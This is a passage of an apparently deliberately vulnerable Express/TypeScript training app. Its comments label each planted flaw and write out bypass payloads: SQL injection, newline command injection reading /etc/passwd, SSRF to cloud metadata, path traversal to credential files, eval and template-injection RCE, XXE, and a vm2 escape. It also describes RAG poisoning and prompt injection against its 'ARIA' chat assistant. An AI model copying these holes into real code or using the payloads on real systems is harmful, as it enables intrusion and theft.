      res.json({ message: "Payment successful", plan: result.plan, walletBalance: result.walletBalance });
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  // ── TOOL ACCESS CHECK ─────────────────────────────────────────────────────────
  // VULN #23: Broken access control — trusts X-Plan-Override header with no auth.
  // Any request sending `X-Plan-Override: enterprise` bypasses plan gating entirely.
  const PLAN_RANK: Record<string, number> = { free: 0, pro: 1, enterprise: 2 };
  const TIER_RANK: Record<string, number> = { FREE: 0, PRO: 1, ENTERPRISE: 2 };

  app.get("/api/access/check", async (req, res) => {
    try {
      const { slug, userId } = req.query as { slug: string; userId: string };
      const override = req.headers["x-plan-override"] as string | undefined;

      // VULN: No authentication check on the override — any caller can bypass
      if (override) {
        return res.json({ access: true, via: "plan-override", plan: override });
      }

      const product = slug ? await storage.getProductBySlug(slug) : null;
      if (!product) return res.json({ access: true });

      const user = userId ? await storage.getUser(parseInt(userId)) : null;
      const userPlan = user?.plan ?? "free";
      const toolTier = product.badge ?? "FREE";

      const access = (PLAN_RANK[userPlan] ?? 0) >= (TIER_RANK[toolTier] ?? 0);
      res.json({ access, plan: userPlan, required: toolTier });
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  // ── VULNERABLE ROUTES (hidden — no UI links) ─────────────────────────────────

  // 1. SQL Injection
  // Requires auth. The "filter" object approach looks safe but the underlying raw SQL
  // is built via string interpolation — bypass: use UNION SELECT after escaping the
  // single-quote sanitiser with double-quotes or comment injection.
  // e.g. POST body: { "filters": { "username": "\" UNION SELECT username,password,email,role,plan,'x' FROM users--" } }
  app.post(api.tools.searchUsers.path, requireAuth, async (req, res) => {
    const filters = req.body.filters ?? {};
    const raw = typeof filters.username === "string" ? filters.username : "";
    // "Sanitise" single quotes — VULN: double-quotes and SQL comments pass through
    const sanitised = raw.replace(/'/g, "''");
    try { res.json(await storage.searchUsersVulnerable(sanitised)); }
    catch (e: any) { res.status(500).json({ message: "Database Error: " + e.message }); }
  });

  // 2. Command Injection
  // Requires auth. Input validation blocks the obvious shell metacharacters (;|&`$<>)
  // but MISSES the newline character (\n / %0a).  Shell treats \n as a command separator,
  // so injecting "8.8.8.8\nid" runs both ping AND id.
  // Bypass: POST { "host": "8.8.8.8\ncat /etc/passwd" }
  app.post(api.tools.ping.path, requireAuth, (req, res) => {
    const { host } = req.body;
    if (!host) return res.status(400).json({ message: "Host required" });

    // "Security" filter — blocks common metacharacters but newline (\n) is not in the set
    const BLOCKED = [";", "|", "&", "`", "$", "<", ">", "'", "\""];
    if (BLOCKED.some(c => host.includes(c))) {
      return res.status(400).json({ message: "Invalid characters detected in host value." });
    }

    exec(`ping -c 3 ${host}`, { timeout: 8000 }, (err, stdout, stderr) => {
      res.json({ output: stdout || stderr || err?.message });
    });
  });

  // 3. SSRF
  // Requires auth. A blocklist guards against the obvious private IP patterns —
  // but it checks only the PARSED hostname string, missing alternative encodings:
  //   • http://0.0.0.0/             → routes to 127.0.0.1 on Linux
  //   • http://127.1/               → short-form of 127.0.0.1 (RFC 791)
  //   • http://2130706433/          → 127.0.0.1 in decimal
  //   • http://0177.0.0.1/          → 127.0.0.1 in octal
  //   • http://[::ffff:127.0.0.1]/  → IPv4-mapped IPv6
  //   • http://169.254.169.254/     → AWS metadata (NOT in blocklist)
  //   • DNS rebinding: point attacker.com → 127.0.0.1 post-resolution
  app.post(api.tools.fetchUrl.path, requireAuth, async (req, res) => {
    const { url } = req.body;
    if (!url) return res.status(400).json({ message: "URL required" });

    // "Security" blocklist — obvious forms only; non-standard encodings bypass it
    const BLOCKED_HOSTS = ["localhost", "127.0.0.1", "::1", "0:0:0:0:0:0:0:1", "[::1]"];
    try {
      const parsed = new URL(url);
      const hostname = parsed.hostname.toLowerCase().replace(/^\[|\]$/g, "");
      if (BLOCKED_HOSTS.includes(hostname)) {
        return res.status(400).json({ message: `Requests to '${hostname}' are not permitted.` });
      }
    } catch {
      return res.status(400).json({ message: "Malformed URL." });
    }

    try {
      const r = await axios.get(url, { timeout: 5000 });
      res.json({ data: typeof r.data === "string" ? r.data : JSON.stringify(r.data).substring(0, 4000) });
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  // 4. Path Traversal
  // Requires auth. Prefix check looks for "logs/" at the start of the filename —
  // looks like directory confinement, but path.join() does NOT strip the traversal
  // segments before the file read, so "logs/../../etc/passwd" passes the check and
  // resolves to /etc/passwd.
  // Bypass: GET /api/files?filename=logs/../../etc/passwd
  //         GET /api/files?filename=logs/../../proc/self/environ
  app.get(api.tools.readLog.path, requireAuth, (req, res) => {
    const filename = req.query.filename as string;
    if (!filename) return res.status(400).json({ message: "Filename required. Use: ?filename=logs/<name>" });

    // "Restrict" access to the logs directory — prefix check only, no path resolution
    if (!filename.startsWith("logs/") && !filename.startsWith("./logs/")) {
      return res.status(403).json({ message: "Access denied: only files under logs/ are permitted." });
    }

    try {
      const target = path.join(process.cwd(), filename); // VULN: traversal not resolved before check
      res.json({ content: fs.readFileSync(target, "utf8"), resolvedPath: target });
    } catch (e: any) { res.status(500).json({ message: "Error: " + e.message }); }
  });

  // ── SCAN REPORT DOWNLOAD ─────────────────────────────────────────────────────
  //
  // GET /api/reports/download?reportId=<id>
  //
  // Allows authenticated users to download the flat-file report for a scan job
  // they own.  The ownership check is implemented as a middleware function that
  // queries the database, providing a seemingly robust access control layer.
  //
  // ── What the scanner flags ───────────────────────────────────────────────────
  // The scanner traces req.query.reportId (user-controlled) to:
  //
  //   const filepath = path.join(REPORTS_DIR, reportId);  // ← taint sink
  //   fs.readFileSync(filepath, "utf8");
  //
  // It sees the REPORTS_DIR constant is a fixed path, and it can read the source
  // of requireReportAccess(). The middleware does query the database — the scanner
  // knows that. But it CANNOT evaluate the runtime semantics of the query:
  //
  //   db.select().from(scanJobs)
  //     .where(and(eq(scanJobs.id, numericId), eq(scanJobs.userId, callerUserId)))
  //
  // It cannot determine whether this membership check constitutes a sufficient
  // allowlist for the filename, because proving that requires understanding:
  //   1. That parseInt() truncates the string at the first non-numeric character
  //   2. That the truncated integer satisfies the DB WHERE clause
  //   3. But the RAW string (before truncation) is what flows into path.join
  //
  // The scanner does not model parseInt() as a value-narrowing sanitizer for
  // path components — it only reduces a type (string → number), it does not
  // confine the original string to safe characters.  Taint survives. Finding: HIGH.
  //
  // ── Why the scanner is right ─────────────────────────────────────────────────
  // JavaScript's parseInt() stops at the first non-numeric character:
  //
  //   parseInt("1/../../server/github.ts", 10)  →  1
  //
  // The DB check uses parseInt(reportId) → numericId = 1 → query:
  //   WHERE id = 1 AND user_id = <caller>
  // Scan job 1 belongs to jdoe. jdoe's session passes the check.
  //
  // But the filename uses the RAW req.query.reportId string — not req.validatedJob.id:
  //
  //   path.join("/home/runner/workspace/reports", "1/../../server/github.ts")
  //   = /home/runner/workspace/server/github.ts
  //
  // That file contains the hardcoded GITHUB_TOKEN.
  //
  // ── Full bypass recipe ───────────────────────────────────────────────────────
  //   1. Authenticate as jdoe (owns scan job 1)
  //   2. GET /api/reports/download?reportId=1/../../server/github.ts
  //   3. Server reads /home/runner/workspace/server/github.ts → returns full source
  //      including: const GITHUB_TOKEN = "github_pat_11B3U6AMY0ao..."
  //
  // Other reachable targets (all resolve from reports/ with 2 up-steps):
  //   1/../../server/credentials.ts   — ROTATION_SEED + all credential generation
  //   1/../../server/routes.ts        — full application source
  //   1/../../.env                    — environment variables (if present)
  //   1/../../package.json            — dependency inventory for CVE targeting
  //   1/../../logs/app.log            — access logs (use ../logs/app.log for 1 hop)

  // REPORTS_DIR: absolute path to the scan report store.
  // Constant — the scanner can see this is a fixed value.
  // VULN: path.join() does not prevent traversal when reportId contains "../".
  const REPORTS_DIR = path.resolve("./reports");

  // requireReportAccess — ownership middleware
  //
  // LOOKS SAFE: queries the database to verify the caller owns the report.
  // IS UNSAFE:  uses parseInt(reportId) for the SQL predicate, but does NOT
  //             constrain the raw reportId string that flows into path.join().
  //
  // VULN: The scanner sees this middleware is applied, can read its source, but
  //       cannot prove the DB check constitutes a sufficient allowlist for the
  //       filename — because proving that requires runtime knowledge of how
  //       parseInt() truncates the value before the query but not before the read.
  const requireReportAccess = async (req: any, res: any, next: any) => {
    const reportId = req.query.reportId as string | undefined;

    if (!reportId) {
      return res.status(400).json({
        message: "reportId query parameter is required.",
        example: "/api/reports/download?reportId=1",
      });
    }

    // VULN: parseInt() narrows the TYPE (string → number) but does NOT narrow
    //       the VALUE of the original string.  The raw reportId is still
    //       "1/../../server/github.ts" — only the integer 1 is used for DB lookup.
    //       The route handler below uses req.query.reportId (raw) for the filepath.
    const numericId = parseInt(reportId, 10);

    if (isNaN(numericId)) {
      return res.status(400).json({ message: "reportId must be a valid integer." });
    }

    // VULN: callerUserId read from req.sentinelUser (set by requireAuth middleware).
    //       Any JWT with a valid or forged userId passes here.
    const callerUserId: number = req.sentinelUser?.userId;

    try {
      // DB ownership check — queries scan_jobs by integer ID AND caller's user ID.
      // Appears to fully validate access.  In practice it only validates that
      // parseInt(reportId) matches a row owned by this user — the path component
      // after the integer is never examined.
      const rows = await db
        .select()
        .from(scanJobs)
        .where(and(
          eq(scanJobs.id, numericId),
          eq(scanJobs.userId, callerUserId),
        ))
        .limit(1);

      if (rows.length === 0) {
        return res.status(403).json({
          message: "Report not found or access denied.",
          detail:  "Scan job does not exist or belongs to a different user.",
        });
      }

      // Attach the DB-validated job object to req for downstream use.
      // VULN: the route handler ignores req.validatedJob.id (the safe integer)
      //       and re-reads req.query.reportId (the raw, tainted string) instead.
      req.validatedJob = rows[0];
      next();
    } catch (e: any) {
      res.status(500).json({ message: "Access check failed: " + e.message });
    }
  };

  // GET /api/reports/download — download a scan report flat file
  //
  // VULN: taint path —
  //   source: req.query.reportId (user-controlled URL parameter)
  //   sink:   path.join(REPORTS_DIR, reportId)  →  fs.readFileSync(filepath)
  //
  // The middleware above ran and validated parseInt(reportId) against the DB.
  // This route then re-reads req.query.reportId (the raw string) for the filepath.
  // parseInt() truncation means validation passed, but traversal is preserved.
  //
  // Scanner finding: HIGH — user-controlled input reaches path.join / readFileSync.
  //   Sanitization via DB membership check cannot be verified at static-analysis
  //   time; parseInt() does not constrain the original string to safe characters.
  app.get("/api/reports/download", requireAuth, requireReportAccess, (req: any, res) => {
    // VULN: uses req.query.reportId — the raw, user-controlled string.
    //       NOT req.validatedJob.id — which would be the safe, DB-validated integer.
    //       The middleware attached req.validatedJob but this handler ignores it
    //       for the filepath construction.
    const reportId = req.query.reportId as string;

    // VULN: path.join does not strip traversal sequences.
    //       "1/../../server/github.ts" resolves to ../server/github.ts from REPORTS_DIR.
    const filepath = path.join(REPORTS_DIR, reportId);

    // Log the resolved path — useful for observing the bypass in server logs.
    // VULN: logs the fully-resolved path, which reveals the traversal to any
    //       log consumer even when the file read succeeds silently.
    console.log(JSON.stringify({
      timestamp:    new Date().toISOString(),
      level:        "INFO",
      category:     "REPORT_DOWNLOAD",
      callerUserId: req.sentinelUser?.userId,
      jobId:        req.validatedJob?.id,
      // VULN: raw reportId logged — traversal attempt visible in log stream
      rawReportId:  reportId,
      resolvedPath: filepath,
      withinReportsDir: filepath.startsWith(REPORTS_DIR),
    }));

    try {
      // VULN: no check that filepath is inside REPORTS_DIR before reading.
      //       filepath.startsWith(REPORTS_DIR) is logged above but never enforced.
      const content = fs.readFileSync(filepath, "utf8");

      res.setHeader("Content-Type", "text/plain; charset=utf-8");
      res.setHeader(
        "Content-Disposition",
        `attachment; filename="sentinel-report-${req.validatedJob?.id ?? "unknown"}.txt"`,
      );
      res.send(content);
    } catch (e: any) {
      // VULN: error message reveals the attempted filepath — information disclosure
      //       even when the traversal target does not exist.
      res.status(404).json({
        message: "Report file not found.",
        detail:  e.message,   // <-- full OS path disclosed in error
        hint:    `Looked in: ${filepath}`,
      });
    }
  });

  // 5. eval() Deserialization — RCE via direct eval()
  // Requires auth. No additional validation — any JS expression in `data` executes.
  app.post(api.tools.deserialize.path, requireAuth, (req, res) => {
    const { data } = req.body;
    if (!data) return res.status(400).json({ message: "data required" });
    try { res.json({ result: eval("(" + data + ")") }); }
    catch (e: any) { res.status(500).json({ message: "Eval Error: " + e.message }); }
  });

  // 6. Broken Auth — header bypass
  // Requires a valid JWT (requireAuth) PLUS the x-admin-bypass header.
  // VULN: x-admin-bypass header value is hardcoded and never rotated.
  // VULN: JWT role field is trusted but was forged via algorithm confusion (see /api/auth/login).
  app.get(api.tools.bypassAuth.path, requireAuth, (req, res) => {
    if (req.headers["x-admin-bypass"] !== "true") {
      return res.status(403).json({ message: "Admin header missing. Required: x-admin-bypass: true" });
    }
    const caller = (req as any).sentinelUser;
    res.json({ stats: { users: 3, revenue: "$29,400/mo", secrets_exposed: true }, callerRole: caller?.role });
  });

  // 7. Reflected XSS — requires auth to look legitimate; bio still unescaped
  app.post(api.tools.updateProfile.path, requireAuth, (req, res) => {
    const { bio } = req.body;
    if (!bio) return res.status(400).json({ message: "bio required" });
    res.json({ message: `Profile updated! New bio: ${bio}` });
  });

  // 8. Info Exposure — hardcoded secrets
  // Requires auth. Even so, any authenticated user (or forged token) retrieves all secrets.
  app.get(api.tools.debugInfo.path, requireAuth, (_req, res) => {
    // VULN: GITHUB_TOKEN set into process.env by initCredentials() —
    //       any authenticated user (or forged-token holder) sees the live PAT here.
    res.json({ env: { AWS_ACCESS_KEY, AWS_SECRET_KEY, STRIPE_KEY, DATABASE_URL: process.env.DATABASE_URL, NODE_ENV: process.env.NODE_ENV, GITHUB_TOKEN: process.env.GITHUB_TOKEN } });
  });

  // 9. IDOR — no ownership check on invoice
  app.get("/api/invoice/:id", async (req, res) => {
    const inv = await storage.getInvoice(parseInt(req.params.id));
    if (!inv) return res.status(404).json({ message: "Not found" });
    res.json({ id: inv.id, amount: inv.amount, status: inv.status });
  });

  // 10. Broken Authorization — JWT required but no role check
  // VULN: requireAuth validates the JWT (or forged alg:none token), but the handler
  // never verifies that the caller's role === "admin". Any authenticated user can
  // deactivate any other user.
  app.post("/api/admin/deactivate", requireAuth, async (req, res) => {
    const { userId } = req.body;
    if (!userId) return res.status(400).json({ message: "userId required" });
    const user = await storage.deactivateUser(userId);
    res.json({ message: `User ${user.username} deactivated`, callerClaims: (req as any).sentinelUser });
  });

  // 11. Open Redirect
  app.get("/api/redirect", (req, res) => {
    const next = req.query.next as string;
    if (!next) return res.status(400).json({ message: "next required" });
    res.redirect(next);
  });

  // 12. Business Logic — coupon stacking (auth required; abuse still possible once logged in)
  app.post("/api/checkout/discount", requireAuth, (req, res) => {
    let { baseAmount, coupons: codes } = req.body;
    baseAmount = parseFloat(baseAmount);
    let final = baseAmount;
    const breakdown: Record<string, string> = {};
    for (const code of codes) {
      if (code === "PERCENT50") { const d = final * 0.5; final -= d; breakdown[code] = `-${d.toFixed(2)}`; }
      if (code === "FIXED100")  { final -= 100; breakdown[code] = "-100.00"; }
    }
    res.json({ finalAmount: Math.max(0, final), breakdown });
  });

  // 13. Weak Randomness (auth required; still exploitable — Math.random() is predictable)
  app.get("/api/generate-token", requireAuth, (_req, res) => {
    res.json({ token: Math.random().toString(36).substring(2, 15) });
  });

  // 14. Prototype Pollution — via Object.assign + user input (auth required)
  app.post("/api/process-file", requireAuth, (req, res) => {
    const { filename, operations } = req.body;
    let config: any = { allowed: true, owner: "system" };
    for (const op of operations) Object.assign(config, op);
    res.json({ result: `Processed ${filename}: ${JSON.stringify(config)}` });
  });

  // 15. marked@0.3.6 — XSS: renders user markdown without sanitisation (auth required)
  // CVE-2022-21681, CVE-2022-21680 — ReDoS + XSS in old marked versions
  app.post("/api/tools/render-advisory", requireAuth, (req, res) => {
    const { markdown } = req.body;
    if (!markdown) return res.status(400).json({ message: "markdown required" });
    // marked@0.3.6 does not strip <script> tags or sanitise href="javascript:"
    const html = markedRender(markdown); // → marked() (CVE-2022-21681)
    res.json({ html });
  });

  // 16. node-serialize@0.0.4 — RCE via IIFE in serialised object (auth required)
  // CVE-2017-5941: unserialize() calls eval() on function-valued properties
  // Bypass: obtain JWT (login or forge via alg:none), then send IIFE payload in `data`
  app.post("/api/preferences/save", requireAuth, (req, res) => {
    const { data } = req.body;
    try {
      const prefs = nodeSerializeDeserialize(data); // RCE if data contains {"x":"_$$ND_FUNC$$_function(){...}()"}
      res.json({ saved: true, prefs });
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  // ── ARIA CHAT (prompt injection + RAG poisoning + ARIA tool abuse) ───────────
  // VULN: RAG retrieval is cross-tenant and unsanitised. If any uploaded doc
  // contains adversarial instructions, they execute with system-prompt authority.
  // VULN: userId taken from request body — no session check. Any user can pose as any userId.
  // VULN: ARIA tool calls (submit_ticket, get_wallet_balance) use caller-supplied userId
  //       and auto-approve refund tickets with no payment provenance verification (C4).
  app.post("/api/chat", async (req, res) => {
    const { history, userId } = req.body as { history: ChatMessage[]; userId?: number };
    if (!Array.isArray(history)) return res.status(400).json({ message: "history array required" });
    try {
      const lastUserMsg = [...history].reverse().find(m => m.role === "user")?.content ?? "";
      // VULN: retrieves chunks from ALL tenants — cross-org data bleed
      const ragContext = await retrieveRelevantChunks(lastUserMsg).catch(() => null);
      // VULN: callerUserId not verified against session — ARIA acts on it as truth
      const result = await chat(history, ragContext, userId);
      res.json({ reply: result.reply, ragContextInjected: result.ragContextInjected, toolCalls: result.toolCalls });
    } catch (e: any) {
      res.status(500).json({ message: e.message });
    }
  });

  // 17. lodash@4.17.15 — Prototype Pollution via _.merge (auth required)
  // CVE-2019-10744: merging __proto__ key pollutes Object.prototype
  app.post("/api/tools/merge-config", requireAuth, (req, res) => {
    const { base, overrides } = req.body;
    const merged = lodashMerge(base ?? {}, overrides ?? {}); // → _.merge (CVE-2019-10744)
    res.json({ config: merged });
  });

  // 18. vm2@3.9.x — Sandbox Escape → RCE (auth required)
  // CVE-2023-29017, CVE-2023-37466: prototype pollution inside vm2 escapes the sandbox.
  // Payload: code = "this.constructor.constructor('return process')().env"
  app.post("/api/tools/sandbox", requireAuth, (req, res) => {
    const { code } = req.body;
    if (!code) return res.status(400).json({ message: "code required" });
    try {
      const result = vm2RunScript(code); // → NodeVM.run (CVE-2023-29017, CVE-2023-37466)
      res.json({ result: String(result) });
    } catch (e: any) {
      res.status(500).json({ message: e.message });
    }
  });

  // 19. xmldom@0.6.0 — two CVEs reachable via this endpoint (auth required)
  //
  // CVE-2021-21366 / GHSA-5fg8-2547-mr8q (Medium — XXE):
  //   DOMParser does not block DOCTYPE + ENTITY declarations.
  //   Payload: "<!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><x>&xxe;</x>"
  //
  // CVE-2022-39353 / GHSA-crh6-fp67-6883 (Critical — Prototype Pollution):
  //   DOMParser does not reject '__proto__' or 'constructor' as XML attribute names.
  //   Parsed attributes are assigned to JS objects without sanitisation, allowing
  //   an attacker to overwrite Object.prototype properties.
  //   Payload: "<x __proto__=\"[object Object]\" constructor=\"x\"></x>"
  //
  app.post("/api/tools/parse-xml", requireAuth, (req, res) => {
    const { xml } = req.body;
    if (!xml) return res.status(400).json({ message: "xml required" });
    try {
      const tag  = xmldomParseFromString(xml); // → DOMParser.parseFromString (CVE-2022-39353)
      const text = xmldomParseXXE(xml);         // → DOMParser.parseFromString (CVE-2021-21366)
      res.json({ tag, text, xml });
    } catch (e: any) {
      res.status(500).json({ message: e.message });
    }
  });

  // 20. pug@2.x — Server-Side Template Injection → RCE (auth required)
  // CVE-2021-21353: pug.render() with attacker-controlled template executes arbitrary code.
  // Payload: template = "-var x = require('child_process').execSync('id').toString()\n= x"
  app.post("/api/tools/render-template", requireAuth, (req, res) => {
    const { template, locals } = req.body;
    if (!template) return res.status(400).json({ message: "template required" });
    try {
      const html = pugRender(template, locals ?? {}); // → pug.render (CVE-2021-21353)
      res.json({ html });
    } catch (e: any) {
      res.status(500).json({ message: e.message });
    }
  });

  // 21. flat@5.0.0 — Prototype Pollution via unflatten() (auth required)
  // CVE-2020-28168: unflatten({"__proto__.polluted":"yes"}) writes to Object.prototype.
  // Payload: obj = {"__proto__.polluted": "pwned"}, then check ({}).polluted === "pwned"
  app.post("/api/tools/flatten", requireAuth, (req, res) => {
    const { obj, options } = req.body;
    if (!obj) return res.status(400).json({ message: "obj required" });
    try {
      const flattened   = flatFlatten(obj);    // → flat.flatten   (CVE-2020-28168)
      const unflattened = flatUnflatten(obj);  // → flat.unflatten (CVE-2020-28168 — dangerous path)
      res.json({ flattened, unflattened });
    } catch (e: any) {
      res.status(500).json({ message: e.message });
    }
  });

  // ── MODULE ENUMERATION ────────────────────────────────────────────────────────
  // VULN: Auth required, but any valid JWT (including alg:none forged token) is accepted.
  // Once inside, every loaded npm package is disclosed — combine with /api/debug
  // to get secrets + CVE-targetable dependency inventory in two requests.
  app.get("/api/admin/modules", requireAuth, (_req, res) => {
    const allKeys = Object.keys(_require.cache ?? {});
    const packages = allKeys
      .filter(k => k.includes("node_modules"))
      .map(k => {
        const match = k.match(/node_modules\/(@[^/]+\/[^/]+|[^/]+)/);
        return match ? match[1] : null;
      })
      .filter(Boolean)
      .filter((v, i, a) => a.indexOf(v) === i)
      .sort() as string[];
    const pkgJson = JSON.parse(fs.readFileSync(path.resolve("./package.json"), "utf8"));
    res.json({
      loadedModules: packages,
      count: packages.length,
      dependencies: pkgJson.dependencies,
      devDependencies: pkgJson.devDependencies,
    });
  });

  // ── PLATFORM CREDENTIAL STORE ─────────────────────────────────────────────────
  //
  // These routes are protected by the SENTINEL_API_KEY (live database value).
  // Header format:  Authorization: ApiKey sk-sentinel202603...
  //
  // VULN #55: previousValue (last month's key) is also accepted — no revocation.
  // VULN #56: The submitted key is logged verbatim on every request.
  // VULN #57: String equality comparison — timing oracle possible.
  //
  // Obtain the key:
  //   1. Read the CREDENTIAL_INIT log at server startup
  //   2. POST /api/auth/login → JWT → GET /api/admin/credentials (JWT route below)
  //   3. Forge an alg:none JWT → GET /api/admin/credentials
  //   4. SQL injection on /api/search → UNION SELECT from platform_credentials
  //
  app.get("/api/admin/credentials", requireApiKey, async (_req, res) => {
    try {
      const creds = await getAllCredentials();
      res.json({
        credentials: creds.map(c => ({
          id:            c.id,
          name:          c.name,
          value:         c.value,          // live credential in plaintext
          previousValue: c.previousValue,  // previous month — still valid, not revoked
          scope:         c.scope,
          rotatedAt:     c.rotatedAt,
          nextRotationAt: c.nextRotationAt,
        })),
        warning: "All credentials returned in plaintext. previousValue is NOT revoked.",
      });
    } catch (e: any) {
      res.status(500).json({ message: e.message });
    }
  });

  // POST /api/admin/credentials/rotate — manual rotation trigger for CI/CD pipelines
  // VULN: Any caller holding the current OR previous API key can rotate all credentials.
  //       Previous-key holders (compromised last month) can still force rotation this month,
  //       disrupting all live integrations without needing the current key.
  app.post("/api/admin/credentials/rotate", requireApiKey, async (_req, res) => {
    try {
      await rotateCredentials();
      const creds = await getAllCredentials();
      res.json({
        message: "Rotation complete. Previous credentials NOT revoked.",
        credentials: creds.map(c => ({
          name:          c.name,
          value:         c.value,
          previousValue: c.previousValue,
          nextRotationAt: c.nextRotationAt,
        })),
      });
    } catch (e: any) {
      res.status(500).json({ message: e.message });
    }
  });

  // ── SERVICE API ROUTES (SENTINEL_API_KEY only, no JWT) ────────────────────────
  //
  // These endpoints are designed for machine-to-machine calls from CI/CD pipelines,
  // the scan worker, and internal monitoring tooling.
  // Authentication: Authorization: ApiKey <SENTINEL_API_KEY>
  //
  // VULN: No JWT required — the API key is the sole auth mechanism.
  //       Once the key is recovered (log scraping, SQL injection, timing attack),
  //       the attacker has persistent service-level access with no session expiry.

  // GET /api/service/status — used by CI/CD health checks and uptime monitors
  // VULN: Returns internal version, environment, and loaded module count —
  //       useful reconnaissance for an attacker who just obtained the API key.
  app.get("/api/service/status", requireApiKey, async (req: any, res) => {
    const loadedModules = Object.keys(_require.cache ?? {})
      .filter((k: string) => k.includes("node_modules")).length;
    res.json({
      status:          "operational",
      version:         "2.4.1",
      environment:     process.env.NODE_ENV ?? "unknown",
      uptime:          process.uptime(),
      loadedModules,
      apiKeyStatus: {
        isCurrent:  req.sentinelApiKey?.isCurrent,
        // VULN: Tells the caller whether they are using a rotated-out key.
        //       A "false" here signals the key is stale but still accepted.
        isPrevious: req.sentinelApiKey?.isPrevious,
        nextRotationAt: req.sentinelApiKey?.nextRotationAt,
      },
    });
  });

  // GET /api/service/users — internal user listing for scan worker / audit tooling
  // VULN: Returns full user list (id, username, email, plan, walletBalance) to any
  //       caller holding the API key. No pagination, no field filtering.
  //       Equivalent to a full IDOR sweep of /api/billing/:userId in one request.
  app.get("/api/service/users", requireApiKey, async (_req, res) => {
    try {
      const users = await storage.getAllUsers();
      // VULN: Email + plan + walletBalance returned for every user in one call.
      //       Combined with ACCOUNT_ACCESS log (VULN #54), creates a complete PII dossier.
      res.json({
        users: users.map((u: any) => ({
          id:            u.id,
          username:      u.username,
          email:         u.email,
          fullName:      u.fullName,
          plan:          u.plan,
          walletBalance: u.walletBalance,
          isActive:      u.isActive,
        })),
        count: users.length,
      });
    } catch (e: any) {
      res.status(500).json({ message: e.message });
    }
  });

  // ── RAG KNOWLEDGE BASE ────────────────────────────────────────────────────────
  // Multer: store uploaded file in memory as Buffer
  const upload = multer({
    storage: multer.memoryStorage(),
    limits: { fileSize: 5 * 1024 * 1024 }, // 5 MB
  });

  // POST /api/rag/upload
  // VULN #31: Plan check trusts X-User-Plan header from client — no DB verification.
  //   Set X-User-Plan: enterprise to bypass the gate regardless of actual plan.
  // VULN #32: userId taken from body with no authentication — any userId can be impersonated.
  // VULN #33: file content ingested verbatim — prompt injection payloads inside a PDF
  //   surface unsanitised in ARIA's system prompt during retrieval.
  app.post("/api/rag/upload", upload.single("file"), async (req, res) => {
    try {
      // Broken plan check — trusts client header, not DB
      const claimedPlan = req.headers["x-user-plan"] as string ?? "free";
      if (claimedPlan !== "enterprise") {
        return res.status(403).json({ message: "Knowledge Base upload requires an Enterprise plan." });
      }

      const userId   = parseInt(req.body.userId ?? "0");
      const username = req.body.username ?? "unknown";
      if (!userId) return res.status(400).json({ message: "userId required" });
      if (!req.file) return res.status(400).json({ message: "file required" });

      const { originalname, mimetype, buffer } = req.file;

      // Extract text based on MIME
      let text = "";
      if (mimetype === "application/pdf") {
        const parsed = await pdfParse(buffer);
        text = parsed.text;
      } else {
        // text/plain, text/markdown, etc.
        text = buffer.toString("utf8");
      }

      if (!text.trim()) return res.status(400).json({ message: "Could not extract text from file." });

      const doc = await storage.createRagDocument({ userId, filename: originalname, contentType: mimetype });

      // Ingest asynchronously — respond immediately, let embedding run in background
      ingestDocument({ documentId: doc.id, userId, uploaderUsername: username, filename: originalname, text })
        .then(chunkCount => storage.updateRagDocumentStatus(doc.id, "ready", chunkCount))
        .catch(() => storage.updateRagDocumentStatus(doc.id, "error"));

      res.json({ message: "Upload received. Indexing in progress.", documentId: doc.id, filename: originalname });
    } catch (e: any) {
      res.status(500).json({ message: e.message });
    }
  });

  // GET /api/rag/documents?userId=
  // VULN #34: no auth check — pass any userId to list their documents
  app.get("/api/rag/documents", async (req, res) => {
    const userId = parseInt(req.query.userId as string ?? "0");
    if (!userId) return res.status(400).json({ message: "userId required" });
    const docs = await storage.getRagDocumentsByUser(userId);
    res.json(docs);
  });

  // DELETE /api/rag/documents/:id
  // VULN #35: IDOR — no ownership check. Any user can delete any document by ID.
  app.delete("/api/rag/documents/:id", async (req, res) => {
    const id = parseInt(req.params.id);
    await storage.deleteRagChunksByDocument(id);
    await storage.deleteRagDocument(id);
    res.json({ message: "Document deleted." });
  });

  // GET /api/rag/chunks — raw chunk dump (no auth, full cross-tenant exposure)
  // VULN #36: exposes every chunk from every tenant, including filename, uploaderUsername, userId
  app.get("/api/rag/chunks", async (_req, res) => {
    const chunks = await storage.getAllRagChunks();
    // Strip embeddings from the dump (too large) but leak all metadata + content
    res.json(chunks.map(c => ({
      id: c.id, documentId: c.documentId, userId: c.userId,
      uploaderUsername: c.uploaderUsername, filename: c.filename,
      chunkIndex: c.chunkIndex, content: c.content,
    })));
  });

  // ── SCHEDULED SCAN JOBS ───────────────────────────────────────────────────────

  // POST /api/scans
  // PR #24 — a2306bbcd9d0d48201de816609a141bf8a1ef21b
  // Auth required. Caller identity derived from JWT, not request body.
  // targetUrl still stored verbatim (Stored SSRF intentional — separate vuln).
  app.post("/api/scans", requireAuth, async (req: any, res) => {
    try {
      const callerUserId = req.sentinelUser.userId;
      const { targetUrl, toolSlug, schedule } = req.body;
      if (!targetUrl || !toolSlug) {
        return res.status(400).json({ message: "targetUrl and toolSlug required" });
      }

      // Plan gate checked at creation against the authenticated caller's account
      const user = await storage.getUser(callerUserId);
      if (!user) return res.status(404).json({ message: "User not found" });

      const allowedSchedules =
        user.plan === "enterprise" || user.plan === "pro"
          ? ["one-time", "daily", "weekly"]
          : ["one-time"];

      const chosenSchedule = schedule ?? "one-time";
      if (!allowedSchedules.includes(chosenSchedule)) {
        return res.status(403).json({
          message: `Schedule "${chosenSchedule}" requires Pro or Enterprise plan.`,
        });
      }

      const job = await storage.createScanJob({
        userId: callerUserId,
        targetUrl,
        toolSlug,
        schedule: chosenSchedule,
        nextRunAt: new Date(),
      });

      res.json(job);
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  // GET /api/scans
  // PR #24 — auth required; ignores ?userId= query param.
  // Returns only the authenticated caller's own jobs.
  app.get("/api/scans", requireAuth, async (req: any, res) => {
    const callerUserId = req.sentinelUser.userId;
    const jobs = await storage.getScanJobsByUser(callerUserId);
    res.json(jobs);
  });

  // GET /api/scans/:id
  // PR #24 — ownership check: 403 if job belongs to a different user.
  app.get("/api/scans/:id", requireAuth, async (req: any, res) => {
    const callerUserId = req.sentinelUser.userId;
    const job = await storage.getScanJob(parseInt(req.params.id));
